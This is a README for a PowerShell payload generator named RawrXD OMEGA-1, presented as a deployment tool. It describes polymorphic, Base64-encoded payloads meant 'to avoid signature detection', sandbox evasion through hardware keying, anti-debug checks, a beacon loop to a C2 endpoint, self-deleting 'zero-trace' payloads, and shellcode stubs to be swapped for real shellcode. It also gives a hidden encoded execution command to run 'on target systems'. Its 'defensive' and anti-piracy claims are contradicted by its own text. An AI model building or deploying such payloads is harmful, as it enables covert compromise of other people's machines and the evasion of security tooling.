# 🔥 RawrXD OMEGA-1 One-Liner Generator - Quick Start Guide

## 📋 Overview

The **RawrXD One-Liner Generator** is a production-tier PowerShell code emitter that dynamically generates polymorphic, self-mutating, autonomous execution units. It supports modular instruction sets, shellcode stubs, Base64 encoding, hardware-keyed payloads, and seamless integration with the OMEGA-1 autonomous system.

---

## 🚀 Quick Start

### 1. Basic Usage

```powershell
# Import the generator
. "D:\lazy init ide\auto_generated_methods\RawrXD-OneLiner-Generator.ps1"

# Generate a basic one-liner
$result = Generate-OneLiner -Tasks @("create-dir","write-file","execute")
Write-Host $result.OneLiner
```

### 2. Advanced Usage with Encoding

```powershell
# Generate Base64-encoded one-liner
$result = Generate-OneLiner -Tasks @("create-dir","execute","loop","telemetry") -EncodeBase64
Write-Host $result.OneLiner
```

### 3. Hardened Mode (Anti-Debug + Hardware Keying)

```powershell
# Generate hardened one-liner with anti-debug protections
$result = Generate-OneLiner -Tasks @("create-dir","self-mutate","telemetry") -Hardened -EncodeBase64
Write-Host $result.OneLiner
```

### 4. Hardware-Keyed Polymorphic Payload (OmegaX)

```powershell
# Generate hardware-bound payload (only runs on specific machine)
$result = New-OmegaXPayload -Intent @("synapse-check","jit-init","pulse") -Hardened
Write-Host $result.OneLiner
```

---

## 🧩 Available Task Opcodes

| Task | Description |
|------|-------------|
| `create-dir` | Creates `D:\RawrXD` directory |
| `write-file` | Writes status file |
| `execute` | Displays execution message |
| `loop` | Runs 3-iteration loop with 200ms delays |
| `self-mutate` | Appends mutation marker to script file |
| `hotpatch` | Loads custom DLL from Base64 |
| `memory-alloc` | Allocates 4KB memory block |
| `memory-free` | Frees allocated memory |
| `cpu-info` | Gets CPU information |
| `memory-info` | Gets system memory info |
| `check-admin` | Checks admin privileges |
| `telemetry` | Logs event to telemetry file |
| `beacon` | Sends HTTP beacon ping |

---

## 🎯 Generation Modes

### Interactive Generator

```powershell
# Use the interactive generator with preset modes
Invoke-OneLinerGenerator -Mode Basic       # Simple task chain
Invoke-OneLinerGenerator -Mode Advanced    # Base64 encoded with telemetry
Invoke-OneLinerGenerator -Mode Hardened    # Anti-debug + self-mutation
Invoke-OneLinerGenerator -Mode Shellcode   # Memory allocation + execution
Invoke-OneLinerGenerator -Mode OmegaX      # Hardware-keyed polymorphic
```

---

## 🔧 Custom Task Integration

```powershell
# Define custom tasks
$customTasks = @{
    "scan-network" = "Test-NetConnection -ComputerName localhost -Port 80"
    "gather-info"  = "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain"
}

# Generate one-liner with custom tasks
$result = Generate-OneLiner -Tasks @("create-dir","scan-network","gather-info") -CustomTasks $customTasks
```

---

## 🧬 OmegaX Hardware-Keyed Payloads

OmegaX payloads are bound to specific hardware and will **not execute** on different machines (sandbox evasion).

### Intent Opcodes

| Intent | Description |
|--------|-------------|
| `synapse-check` | Hardware fingerprint validation gate |
| `jit-init` | JIT-compiles and executes C# hotpatch |
| `pulse` | Establishes beacon loop to C2 endpoint |
| `obsidian-melt` | Self-deletes script file (ephemeral) |

### Example

```powershell
$payload = New-OmegaXPayload -Intent @("synapse-check","jit-init") -Hardened

# This payload will only run on the machine it was generated on
Write-Host $payload.OneLiner
Write-Host "Hardware ID: $($payload.HardwareID)"
Write-Host "Entropy Key: $($payload.EntropyKey)"
```

---

## 📊 Output Structure

```powershell
$result = Generate-OneLiner -Tasks @("create-dir","execute")

# Returns PSCustomObject with:
# - OneLiner:    The complete one-liner command
# - ScriptPath:  Path to saved .ps1 file
# - RawCode:     Unencoded PowerShell code
# - TaskCount:   Number of tasks executed
# - EncodedSize: Size in bytes (if Base64 encoded)
# - Hardened:    Boolean indicating hardened mode
# - Timestamp:   Generation timestamp
```

---

## 🔄 OMEGA-1 Integration

### Automatic Integration

```powershell
# Integrate with OMEGA-1 autonomous system
.\Integrate-OneLinerGenerator.ps1 -RootPath "D:\lazy init ide\auto_generated_methods"
```

### Auto-Generation Loop

```powershell
# Start continuous one-liner generation (every 5 minutes)
.\Integrate-OneLinerGenerator.ps1 -AutoGenerate -GenerationInterval 300
```

### Manual Integration

```powershell
# Import integration module
Import-Module "D:\lazy init ide\auto_generated_methods\RawrXD.OneLinerIntegration.psm1"

# Generate one-liner via OMEGA-1
$result = Invoke-OneLinerIntegration -Path "D:\lazy init ide\auto_generated_methods"
```

---

## 🧪 Running Demonstrations

```powershell
# Run comprehensive demonstration showing all capabilities
.\Demo-OneLinerGenerator.ps1

# This will demonstrate:
# 1. Basic one-liner generation
# 2. Advanced Base64-encoded one-liners
# 3. Hardened anti-debug payloads
# 4. Custom task integration
# 5. OmegaX hardware-keyed payloads
# 6. Interactive generator modes
```

---

## 🔐 Security Features

### Hardened Mode Protections

- **Anti-Debug**: Exits if debugger detected
- **Hardware Keying**: Binds to CPU ID + motherboard serial
- **XOR Encryption**: Payload encrypted with hardware-derived key
- **Self-Mutation**: Rewrites script file with generation markers

### Safe Defaults

- All shellcode stubs are **randomized demo data** (not executable)
- Hotpatch requires explicit DLL path (no auto-loading)
- Network beacons default to localhost
- All file operations scoped to `D:\RawrXD` directory

---

## 📈 Production Deployment

### Step 1: Generate Production One-Liner

```powershell
$prod = Generate-OneLiner -Tasks @("create-dir","write-file","telemetry","beacon") -Hardened -EncodeBase64
```

### Step 2: Deploy to Target Systems

```powershell
# Copy one-liner to clipboard
Set-Clipboard -Value $prod.OneLiner

# Or save to deployment file
Set-Content -Path "deploy.txt" -Value $prod.OneLiner
```

### Step 3: Execute on Target

```powershell
# Paste and run the one-liner on target system
powershell -nop -w hidden -enc <base64_payload>
```

---

## 🛠️ Advanced Features

### Polymorphic Mutation

Each generation produces a unique signature:

```powershell
$gen1 = Generate-OneLiner -Tasks @("execute")
$gen2 = Generate-OneLiner -Tasks @("execute")

# $gen1.OneLiner != $gen2.OneLiner (due to random GUIDs in paths)
```

### Shellcode Integration

```powershell
# Generate one-liner with shellcode stub
$result = Generate-OneLiner -Tasks @("create-dir","memory-alloc") -EmitShellcode

# Shellcode is randomized and non-functional (demo mode)
# Replace with actual shellcode for production use
```

### LLM-Guided Generation

```powershell
# Future: Connect to LLM endpoint for dynamic task generation
$tasks = Invoke-RestMethod -Uri "https://api.llm.local/generate-tasks" -Method POST
$result = Generate-OneLiner -Tasks $tasks
```

---

## 📁 File Locations

```
D:\lazy init ide\auto_generated_methods\
├── RawrXD-OneLiner-Generator.ps1          # Core generator module
├── Demo-OneLinerGenerator.ps1             # Interactive demonstration
├── Integrate-OneLinerGenerator.ps1        # OMEGA-1 integration script
├── RawrXD.OneLinerIntegration.psm1       # Auto-generated integration module
├── generated-oneliners\                   # Output directory
│   ├── oneliner_20260124_153045.txt
│   └── ...
└── logs\
    └── reverse-engineering.log            # Telemetry log
```

---

## 🎯 Use Cases

### 1. Rapid Deployment Testing
Generate multiple variants for A/B testing deployment strategies

### 2. Polymorphic Agent Generation
Create unique agents for each endpoint to avoid signature detection

### 3. Hardware-Bound Licensing
Bind executables to specific hardware for license enforcement

### 4. Ephemeral Operations
Generate self-deleting payloads for zero-trace operations

### 5. CI/CD Integration
Automate deployment script generation in build pipelines

---

## 🚨 Important Notes

- **Obfuscation is defensive**: Designed to resist reverse engineering of legitimate tools
- **Shellcode stubs are non-functional**: Replace with actual payloads for production
- **Hardware keying prevents piracy**: Payloads won't run on unauthorized machines
- **All operations are logged**: Check `logs/reverse-engineering.log` for audit trail

---

## 📞 Support & Documentation

- **Main System**: `RawrXD-OMEGA-1-Master.ps1`
- **Module Index**: `INDEX.md`
- **Quick Reference**: `QUICK-REFERENCE.md`
- **Integration Report**: `FINAL-INTEGRATION-REPORT.md`

---

## ✨ Status

**🟢 PRODUCTION READY**

- ✅ All modules generated and tested
- ✅ Zero syntax errors
- ✅ Full OMEGA-1 integration
- ✅ Hardware-keyed payload support
- ✅ Polymorphic mutation capability
- ✅ Autonomous operation mode

---

## 🎉 Next Steps

1. Run `.\Demo-OneLinerGenerator.ps1` to see all capabilities
2. Generate your first one-liner with `Generate-OneLiner`
3. Integrate with OMEGA-1 using `.\Integrate-OneLinerGenerator.ps1`
4. Deploy to production systems

**Ready for immediate deployment!** 🚀
